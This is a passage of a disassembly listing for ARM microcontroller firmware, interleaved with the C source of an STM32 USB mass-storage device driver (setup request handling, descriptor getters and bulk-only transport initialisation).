 8008f4c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008f50:	687a      	ldr	r2, [r7, #4]
 8008f52:	33b0      	adds	r3, #176	; 0xb0
 8008f54:	009b      	lsls	r3, r3, #2
 8008f56:	4413      	add	r3, r2
 8008f58:	685b      	ldr	r3, [r3, #4]
 8008f5a:	699b      	ldr	r3, [r3, #24]
 8008f5c:	4798      	blx	r3
 8008f5e:	4603      	mov	r3, r0
 8008f60:	461a      	mov	r2, r3
 8008f62:	693b      	ldr	r3, [r7, #16]
 8008f64:	601a      	str	r2, [r3, #0]
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->max_lun, 1U);
 8008f66:	693b      	ldr	r3, [r7, #16]
 8008f68:	2201      	movs	r2, #1
 8008f6a:	4619      	mov	r1, r3
 8008f6c:	6878      	ldr	r0, [r7, #4]
 8008f6e:	f003 f979 	bl	800c264 <USBD_CtlSendData>
 8008f72:	bf00      	nop
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008f74:	e025      	b.n	8008fc2 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008f76:	6839      	ldr	r1, [r7, #0]
 8008f78:	6878      	ldr	r0, [r7, #4]
 8008f7a:	f003 f902 	bl	800c182 <USBD_CtlError>
            ret = USBD_FAIL;
 8008f7e:	2303      	movs	r3, #3
 8008f80:	75fb      	strb	r3, [r7, #23]
          break;
 8008f82:	e01e      	b.n	8008fc2 <USBD_MSC_Setup+0xde>

        case BOT_RESET :
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008f84:	683b      	ldr	r3, [r7, #0]
 8008f86:	885b      	ldrh	r3, [r3, #2]
 8008f88:	2b00      	cmp	r3, #0
 8008f8a:	d10c      	bne.n	8008fa6 <USBD_MSC_Setup+0xc2>
 8008f8c:	683b      	ldr	r3, [r7, #0]
 8008f8e:	88db      	ldrh	r3, [r3, #6]
 8008f90:	2b00      	cmp	r3, #0
 8008f92:	d108      	bne.n	8008fa6 <USBD_MSC_Setup+0xc2>
              ((req->bmRequest & 0x80U) != 0x80U))
 8008f94:	683b      	ldr	r3, [r7, #0]
 8008f96:	781b      	ldrb	r3, [r3, #0]
 8008f98:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008f9a:	2b00      	cmp	r3, #0
 8008f9c:	db03      	blt.n	8008fa6 <USBD_MSC_Setup+0xc2>
          {
            MSC_BOT_Reset(pdev);
 8008f9e:	6878      	ldr	r0, [r7, #4]
 8008fa0:	f000 f9bc 	bl	800931c <MSC_BOT_Reset>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008fa4:	e00d      	b.n	8008fc2 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008fa6:	6839      	ldr	r1, [r7, #0]
 8008fa8:	6878      	ldr	r0, [r7, #4]
 8008faa:	f003 f8ea 	bl	800c182 <USBD_CtlError>
            ret = USBD_FAIL;
 8008fae:	2303      	movs	r3, #3
 8008fb0:	75fb      	strb	r3, [r7, #23]
          break;
 8008fb2:	e006      	b.n	8008fc2 <USBD_MSC_Setup+0xde>

        default:
          USBD_CtlError(pdev, req);
 8008fb4:	6839      	ldr	r1, [r7, #0]
 8008fb6:	6878      	ldr	r0, [r7, #4]
 8008fb8:	f003 f8e3 	bl	800c182 <USBD_CtlError>
          ret = USBD_FAIL;
 8008fbc:	2303      	movs	r3, #3
 8008fbe:	75fb      	strb	r3, [r7, #23]
          break;
 8008fc0:	bf00      	nop
      }
      break;
 8008fc2:	e086      	b.n	80090d2 <USBD_MSC_Setup+0x1ee>
    /* Interface & Endpoint request */
    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8008fc4:	683b      	ldr	r3, [r7, #0]
 8008fc6:	785b      	ldrb	r3, [r3, #1]
 8008fc8:	2b0b      	cmp	r3, #11
 8008fca:	d872      	bhi.n	80090b2 <USBD_MSC_Setup+0x1ce>
 8008fcc:	a201      	add	r2, pc, #4	; (adr r2, 8008fd4 <USBD_MSC_Setup+0xf0>)
 8008fce:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008fd2:	bf00      	nop
 8008fd4:	08009005 	.word	0x08009005
 8008fd8:	08009081 	.word	0x08009081
 8008fdc:	080090b3 	.word	0x080090b3
 8008fe0:	080090b3 	.word	0x080090b3
 8008fe4:	080090b3 	.word	0x080090b3
 8008fe8:	080090b3 	.word	0x080090b3
 8008fec:	080090b3 	.word	0x080090b3
 8008ff0:	080090b3 	.word	0x080090b3
 8008ff4:	080090b3 	.word	0x080090b3
 8008ff8:	080090b3 	.word	0x080090b3
 8008ffc:	0800902f 	.word	0x0800902f
 8009000:	08009059 	.word	0x08009059
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009004:	687b      	ldr	r3, [r7, #4]
 8009006:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800900a:	b2db      	uxtb	r3, r3
 800900c:	2b03      	cmp	r3, #3
 800900e:	d107      	bne.n	8009020 <USBD_MSC_Setup+0x13c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8009010:	f107 030e 	add.w	r3, r7, #14
 8009014:	2202      	movs	r2, #2
 8009016:	4619      	mov	r1, r3
 8009018:	6878      	ldr	r0, [r7, #4]
 800901a:	f003 f923 	bl	800c264 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 800901e:	e050      	b.n	80090c2 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009020:	6839      	ldr	r1, [r7, #0]
 8009022:	6878      	ldr	r0, [r7, #4]
 8009024:	f003 f8ad 	bl	800c182 <USBD_CtlError>
            ret = USBD_FAIL;
 8009028:	2303      	movs	r3, #3
 800902a:	75fb      	strb	r3, [r7, #23]
          break;
 800902c:	e049      	b.n	80090c2 <USBD_MSC_Setup+0x1de>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800902e:	687b      	ldr	r3, [r7, #4]
 8009030:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009034:	b2db      	uxtb	r3, r3
 8009036:	2b03      	cmp	r3, #3
 8009038:	d107      	bne.n	800904a <USBD_MSC_Setup+0x166>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->interface, 1U);
 800903a:	693b      	ldr	r3, [r7, #16]
 800903c:	3304      	adds	r3, #4
 800903e:	2201      	movs	r2, #1
 8009040:	4619      	mov	r1, r3
 8009042:	6878      	ldr	r0, [r7, #4]
 8009044:	f003 f90e 	bl	800c264 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009048:	e03b      	b.n	80090c2 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 800904a:	6839      	ldr	r1, [r7, #0]
 800904c:	6878      	ldr	r0, [r7, #4]
 800904e:	f003 f898 	bl	800c182 <USBD_CtlError>
            ret = USBD_FAIL;
 8009052:	2303      	movs	r3, #3
 8009054:	75fb      	strb	r3, [r7, #23]
          break;
 8009056:	e034      	b.n	80090c2 <USBD_MSC_Setup+0x1de>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009058:	687b      	ldr	r3, [r7, #4]
 800905a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800905e:	b2db      	uxtb	r3, r3
 8009060:	2b03      	cmp	r3, #3
 8009062:	d106      	bne.n	8009072 <USBD_MSC_Setup+0x18e>
          {
            hmsc->interface = (uint8_t)(req->wValue);
 8009064:	683b      	ldr	r3, [r7, #0]
 8009066:	885b      	ldrh	r3, [r3, #2]
 8009068:	b2db      	uxtb	r3, r3
 800906a:	461a      	mov	r2, r3
 800906c:	693b      	ldr	r3, [r7, #16]
 800906e:	605a      	str	r2, [r3, #4]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009070:	e027      	b.n	80090c2 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009072:	6839      	ldr	r1, [r7, #0]
 8009074:	6878      	ldr	r0, [r7, #4]
 8009076:	f003 f884 	bl	800c182 <USBD_CtlError>
            ret = USBD_FAIL;
 800907a:	2303      	movs	r3, #3
 800907c:	75fb      	strb	r3, [r7, #23]
          break;
 800907e:	e020      	b.n	80090c2 <USBD_MSC_Setup+0x1de>

        case USB_REQ_CLEAR_FEATURE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009080:	687b      	ldr	r3, [r7, #4]
 8009082:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009086:	b2db      	uxtb	r3, r3
 8009088:	2b03      	cmp	r3, #3
 800908a:	d119      	bne.n	80090c0 <USBD_MSC_Setup+0x1dc>
          {
            if (req->wValue == USB_FEATURE_EP_HALT)
 800908c:	683b      	ldr	r3, [r7, #0]
 800908e:	885b      	ldrh	r3, [r3, #2]
 8009090:	2b00      	cmp	r3, #0
 8009092:	d115      	bne.n	80090c0 <USBD_MSC_Setup+0x1dc>
            {
              /* Flush the FIFO */
              (void)USBD_LL_FlushEP(pdev, (uint8_t)req->wIndex);
 8009094:	683b      	ldr	r3, [r7, #0]
 8009096:	889b      	ldrh	r3, [r3, #4]
 8009098:	b2db      	uxtb	r3, r3
 800909a:	4619      	mov	r1, r3
 800909c:	6878      	ldr	r0, [r7, #4]
 800909e:	f003 fdad 	bl	800cbfc <USBD_LL_FlushEP>

              /* Handle BOT error */
              MSC_BOT_CplClrFeature(pdev, (uint8_t)req->wIndex);
 80090a2:	683b      	ldr	r3, [r7, #0]
 80090a4:	889b      	ldrh	r3, [r3, #4]
 80090a6:	b2db      	uxtb	r3, r3
 80090a8:	4619      	mov	r1, r3
 80090aa:	6878      	ldr	r0, [r7, #4]
 80090ac:	f000 fb54 	bl	8009758 <MSC_BOT_CplClrFeature>
            }
          }
          break;
 80090b0:	e006      	b.n	80090c0 <USBD_MSC_Setup+0x1dc>

        default:
          USBD_CtlError(pdev, req);
 80090b2:	6839      	ldr	r1, [r7, #0]
 80090b4:	6878      	ldr	r0, [r7, #4]
 80090b6:	f003 f864 	bl	800c182 <USBD_CtlError>
          ret = USBD_FAIL;
 80090ba:	2303      	movs	r3, #3
 80090bc:	75fb      	strb	r3, [r7, #23]
          break;
 80090be:	e000      	b.n	80090c2 <USBD_MSC_Setup+0x1de>
          break;
 80090c0:	bf00      	nop
      }
      break;
 80090c2:	e006      	b.n	80090d2 <USBD_MSC_Setup+0x1ee>

    default:
      USBD_CtlError(pdev, req);
 80090c4:	6839      	ldr	r1, [r7, #0]
 80090c6:	6878      	ldr	r0, [r7, #4]
 80090c8:	f003 f85b 	bl	800c182 <USBD_CtlError>
      ret = USBD_FAIL;
 80090cc:	2303      	movs	r3, #3
 80090ce:	75fb      	strb	r3, [r7, #23]
      break;
 80090d0:	bf00      	nop
  }

  return (uint8_t)ret;
 80090d2:	7dfb      	ldrb	r3, [r7, #23]
}
 80090d4:	4618      	mov	r0, r3
 80090d6:	3718      	adds	r7, #24
 80090d8:	46bd      	mov	sp, r7
 80090da:	bd80      	pop	{r7, pc}

080090dc <USBD_MSC_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80090dc:	b580      	push	{r7, lr}
 80090de:	b082      	sub	sp, #8
 80090e0:	af00      	add	r7, sp, #0
 80090e2:	6078      	str	r0, [r7, #4]
 80090e4:	460b      	mov	r3, r1
 80090e6:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataIn(pdev, epnum);
 80090e8:	78fb      	ldrb	r3, [r7, #3]
 80090ea:	4619      	mov	r1, r3
 80090ec:	6878      	ldr	r0, [r7, #4]
 80090ee:	f000 f961 	bl	80093b4 <MSC_BOT_DataIn>

  return (uint8_t)USBD_OK;
 80090f2:	2300      	movs	r3, #0
}
 80090f4:	4618      	mov	r0, r3
 80090f6:	3708      	adds	r7, #8
 80090f8:	46bd      	mov	sp, r7
 80090fa:	bd80      	pop	{r7, pc}

080090fc <USBD_MSC_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80090fc:	b580      	push	{r7, lr}
 80090fe:	b082      	sub	sp, #8
 8009100:	af00      	add	r7, sp, #0
 8009102:	6078      	str	r0, [r7, #4]
 8009104:	460b      	mov	r3, r1
 8009106:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataOut(pdev, epnum);
 8009108:	78fb      	ldrb	r3, [r7, #3]
 800910a:	4619      	mov	r1, r3
 800910c:	6878      	ldr	r0, [r7, #4]
 800910e:	f000 f98d 	bl	800942c <MSC_BOT_DataOut>

  return (uint8_t)USBD_OK;
 8009112:	2300      	movs	r3, #0
}
 8009114:	4618      	mov	r0, r3
 8009116:	3708      	adds	r7, #8
 8009118:	46bd      	mov	sp, r7
 800911a:	bd80      	pop	{r7, pc}

0800911c <USBD_MSC_GetHSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetHSCfgDesc(uint16_t *length)
{
 800911c:	b580      	push	{r7, lr}
 800911e:	b084      	sub	sp, #16
 8009120:	af00      	add	r7, sp, #0
 8009122:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009124:	2181      	movs	r1, #129	; 0x81
 8009126:	4812      	ldr	r0, [pc, #72]	; (8009170 <USBD_MSC_GetHSCfgDesc+0x54>)
 8009128:	f002 f9c8 	bl	800b4bc <USBD_GetEpDesc>
 800912c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800912e:	2101      	movs	r1, #1
 8009130:	480f      	ldr	r0, [pc, #60]	; (8009170 <USBD_MSC_GetHSCfgDesc+0x54>)
 8009132:	f002 f9c3 	bl	800b4bc <USBD_GetEpDesc>
 8009136:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009138:	68fb      	ldr	r3, [r7, #12]
 800913a:	2b00      	cmp	r3, #0
 800913c:	d006      	beq.n	800914c <USBD_MSC_GetHSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 800913e:	68fb      	ldr	r3, [r7, #12]
 8009140:	2200      	movs	r2, #0
 8009142:	711a      	strb	r2, [r3, #4]
 8009144:	2200      	movs	r2, #0
 8009146:	f042 0202 	orr.w	r2, r2, #2
 800914a:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 800914c:	68bb      	ldr	r3, [r7, #8]
 800914e:	2b00      	cmp	r3, #0
 8009150:	d006      	beq.n	8009160 <USBD_MSC_GetHSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 8009152:	68bb      	ldr	r3, [r7, #8]
 8009154:	2200      	movs	r2, #0
 8009156:	711a      	strb	r2, [r3, #4]
 8009158:	2200      	movs	r2, #0
 800915a:	f042 0202 	orr.w	r2, r2, #2
 800915e:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009160:	687b      	ldr	r3, [r7, #4]
 8009162:	2220      	movs	r2, #32
 8009164:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009166:	4b02      	ldr	r3, [pc, #8]	; (8009170 <USBD_MSC_GetHSCfgDesc+0x54>)
}
 8009168:	4618      	mov	r0, r3
 800916a:	3710      	adds	r7, #16
 800916c:	46bd      	mov	sp, r7
 800916e:	bd80      	pop	{r7, pc}
 8009170:	200000e0 	.word	0x200000e0

08009174 <USBD_MSC_GetFSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetFSCfgDesc(uint16_t *length)
{
 8009174:	b580      	push	{r7, lr}
 8009176:	b084      	sub	sp, #16
 8009178:	af00      	add	r7, sp, #0
 800917a:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 800917c:	2181      	movs	r1, #129	; 0x81
 800917e:	4812      	ldr	r0, [pc, #72]	; (80091c8 <USBD_MSC_GetFSCfgDesc+0x54>)
 8009180:	f002 f99c 	bl	800b4bc <USBD_GetEpDesc>
 8009184:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 8009186:	2101      	movs	r1, #1
 8009188:	480f      	ldr	r0, [pc, #60]	; (80091c8 <USBD_MSC_GetFSCfgDesc+0x54>)
 800918a:	f002 f997 	bl	800b4bc <USBD_GetEpDesc>
 800918e:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009190:	68fb      	ldr	r3, [r7, #12]
 8009192:	2b00      	cmp	r3, #0
 8009194:	d006      	beq.n	80091a4 <USBD_MSC_GetFSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 8009196:	68fb      	ldr	r3, [r7, #12]
 8009198:	2200      	movs	r2, #0
 800919a:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 800919e:	711a      	strb	r2, [r3, #4]
 80091a0:	2200      	movs	r2, #0
 80091a2:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80091a4:	68bb      	ldr	r3, [r7, #8]
 80091a6:	2b00      	cmp	r3, #0
 80091a8:	d006      	beq.n	80091b8 <USBD_MSC_GetFSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80091aa:	68bb      	ldr	r3, [r7, #8]
 80091ac:	2200      	movs	r2, #0
 80091ae:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80091b2:	711a      	strb	r2, [r3, #4]
 80091b4:	2200      	movs	r2, #0
 80091b6:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80091b8:	687b      	ldr	r3, [r7, #4]
 80091ba:	2220      	movs	r2, #32
 80091bc:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80091be:	4b02      	ldr	r3, [pc, #8]	; (80091c8 <USBD_MSC_GetFSCfgDesc+0x54>)
}
 80091c0:	4618      	mov	r0, r3
 80091c2:	3710      	adds	r7, #16
 80091c4:	46bd      	mov	sp, r7
 80091c6:	bd80      	pop	{r7, pc}
 80091c8:	200000e0 	.word	0x200000e0

080091cc <USBD_MSC_GetOtherSpeedCfgDesc>:
  *         return other speed configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetOtherSpeedCfgDesc(uint16_t *length)
{
 80091cc:	b580      	push	{r7, lr}
 80091ce:	b084      	sub	sp, #16
 80091d0:	af00      	add	r7, sp, #0
 80091d2:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80091d4:	2181      	movs	r1, #129	; 0x81
 80091d6:	4812      	ldr	r0, [pc, #72]	; (8009220 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 80091d8:	f002 f970 	bl	800b4bc <USBD_GetEpDesc>
 80091dc:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80091de:	2101      	movs	r1, #1
 80091e0:	480f      	ldr	r0, [pc, #60]	; (8009220 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 80091e2:	f002 f96b 	bl	800b4bc <USBD_GetEpDesc>
 80091e6:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80091e8:	68fb      	ldr	r3, [r7, #12]
 80091ea:	2b00      	cmp	r3, #0
 80091ec:	d006      	beq.n	80091fc <USBD_MSC_GetOtherSpeedCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80091ee:	68fb      	ldr	r3, [r7, #12]
 80091f0:	2200      	movs	r2, #0
 80091f2:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80091f6:	711a      	strb	r2, [r3, #4]
 80091f8:	2200      	movs	r2, #0
 80091fa:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80091fc:	68bb      	ldr	r3, [r7, #8]
 80091fe:	2b00      	cmp	r3, #0
 8009200:	d006      	beq.n	8009210 <USBD_MSC_GetOtherSpeedCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 8009202:	68bb      	ldr	r3, [r7, #8]
 8009204:	2200      	movs	r2, #0
 8009206:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 800920a:	711a      	strb	r2, [r3, #4]
 800920c:	2200      	movs	r2, #0
 800920e:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009210:	687b      	ldr	r3, [r7, #4]
 8009212:	2220      	movs	r2, #32
 8009214:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009216:	4b02      	ldr	r3, [pc, #8]	; (8009220 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
}
 8009218:	4618      	mov	r0, r3
 800921a:	3710      	adds	r7, #16
 800921c:	46bd      	mov	sp, r7
 800921e:	bd80      	pop	{r7, pc}
 8009220:	200000e0 	.word	0x200000e0

08009224 <USBD_MSC_GetDeviceQualifierDescriptor>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetDeviceQualifierDescriptor(uint16_t *length)
{
 8009224:	b480      	push	{r7}
 8009226:	b083      	sub	sp, #12
 8009228:	af00      	add	r7, sp, #0
 800922a:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_MSC_DeviceQualifierDesc);
 800922c:	687b      	ldr	r3, [r7, #4]
 800922e:	220a      	movs	r2, #10
 8009230:	801a      	strh	r2, [r3, #0]

  return USBD_MSC_DeviceQualifierDesc;
 8009232:	4b03      	ldr	r3, [pc, #12]	; (8009240 <USBD_MSC_GetDeviceQualifierDescriptor+0x1c>)
}
 8009234:	4618      	mov	r0, r3
 8009236:	370c      	adds	r7, #12
 8009238:	46bd      	mov	sp, r7
 800923a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800923e:	4770      	bx	lr
 8009240:	20000100 	.word	0x20000100

08009244 <USBD_MSC_RegisterStorage>:
  * @brief  USBD_MSC_RegisterStorage
  * @param  fops: storage callback
  * @retval status
  */
uint8_t USBD_MSC_RegisterStorage(USBD_HandleTypeDef *pdev, USBD_StorageTypeDef *fops)
{
 8009244:	b480      	push	{r7}
 8009246:	b083      	sub	sp, #12
 8009248:	af00      	add	r7, sp, #0
 800924a:	6078      	str	r0, [r7, #4]
 800924c:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 800924e:	683b      	ldr	r3, [r7, #0]
 8009250:	2b00      	cmp	r3, #0
 8009252:	d101      	bne.n	8009258 <USBD_MSC_RegisterStorage+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8009254:	2303      	movs	r3, #3
 8009256:	e009      	b.n	800926c <USBD_MSC_RegisterStorage+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8009258:	687b      	ldr	r3, [r7, #4]
 800925a:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800925e:	687a      	ldr	r2, [r7, #4]
 8009260:	33b0      	adds	r3, #176	; 0xb0
 8009262:	009b      	lsls	r3, r3, #2
 8009264:	4413      	add	r3, r2
 8009266:	683a      	ldr	r2, [r7, #0]
 8009268:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 800926a:	2300      	movs	r3, #0
}
 800926c:	4618      	mov	r0, r3
 800926e:	370c      	adds	r7, #12
 8009270:	46bd      	mov	sp, r7
 8009272:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009276:	4770      	bx	lr

08009278 <MSC_BOT_Init>:
  *         Initialize the BOT Process
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_Init(USBD_HandleTypeDef *pdev)
{
 8009278:	b580      	push	{r7, lr}
 800927a:	b084      	sub	sp, #16
 800927c:	af00      	add	r7, sp, #0
 800927e:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009280:	687b      	ldr	r3, [r7, #4]
 8009282:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009286:	687b      	ldr	r3, [r7, #4]
 8009288:	32b0      	adds	r2, #176	; 0xb0
 800928a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800928e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009290:	68fb      	ldr	r3, [r7, #12]
 8009292:	2b00      	cmp	r3, #0
 8009294:	d039      	beq.n	800930a <MSC_BOT_Init+0x92>
  {
    return;
  }

  hmsc->bot_state = USBD_BOT_IDLE;
 8009296:	68fb      	ldr	r3, [r7, #12]
 8009298:	2200      	movs	r2, #0
 800929a:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_NORMAL;
 800929c:	68fb      	ldr	r3, [r7, #12]
 800929e:	2200      	movs	r2, #0
 80092a0:	725a      	strb	r2, [r3, #9]

  hmsc->scsi_sense_tail = 0U;
 80092a2:	68fb      	ldr	r3, [r7, #12]
 80092a4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80092a8:	2200      	movs	r2, #0
 80092aa:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
  hmsc->scsi_sense_head = 0U;
 80092ae:	68fb      	ldr	r3, [r7, #12]
 80092b0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80092b4:	2200      	movs	r2, #0
 80092b6:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
  hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 80092ba:	68fb      	ldr	r3, [r7, #12]
 80092bc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80092c0:	2200      	movs	r2, #0
 80092c2:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62

  ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Init(0U);
 80092c6:	687b      	ldr	r3, [r7, #4]
 80092c8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80092cc:	687a      	ldr	r2, [r7, #4]
 80092ce:	33b0      	adds	r3, #176	; 0xb0
 80092d0:	009b      	lsls	r3, r3, #2
 80092d2:	4413      	add	r3, r2
 80092d4:	685b      	ldr	r3, [r3, #4]
 80092d6:	681b      	ldr	r3, [r3, #0]
 80092d8:	2000      	movs	r0, #0
 80092da:	4798      	blx	r3

  (void)USBD_LL_FlushEP(pdev, MSCOutEpAdd);
 80092dc:	4b0d      	ldr	r3, [pc, #52]	; (8009314 <MSC_BOT_Init+0x9c>)
 80092de:	781b      	ldrb	r3, [r3, #0]
 80092e0:	4619      	mov	r1, r3
 80092e2:	6878      	ldr	r0, [r7, #4]
 80092e4:	f003 fc8a 	bl	800cbfc <USBD_LL_FlushEP>
  (void)USBD_LL_FlushEP(pdev, MSCInEpAdd);
 80092e8:	4b0b      	ldr	r3, [pc, #44]	; (8009318 <MSC_BOT_Init+0xa0>)
 80092ea:	781b      	ldrb	r3, [r3, #0]
 80092ec:	4619      	mov	r1, r3
 80092ee:	6878      	ldr	r0, [r7, #4]
 80092f0:	f003 fc84 	bl	800cbfc <USBD_LL_FlushEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80092f4:	4b07      	ldr	r3, [pc, #28]	; (8009314 <MSC_BOT_Init+0x9c>)
 80092f6:	7819      	ldrb	r1, [r3, #0]
 80092f8:	68fb      	ldr	r3, [r7, #12]
 80092fa:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80092fe:	3210      	adds	r2, #16
 8009300:	231f      	movs	r3, #31
 8009302:	6878      	ldr	r0, [r7, #4]
 8009304:	f003 fdb8 	bl	800ce78 <USBD_LL_PrepareReceive>
 8009308:	e000      	b.n	800930c <MSC_BOT_Init+0x94>
    return;
 800930a:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800930c:	3710      	adds	r7, #16
 800930e:	46bd      	mov	sp, r7
 8009310:	bd80      	pop	{r7, pc}
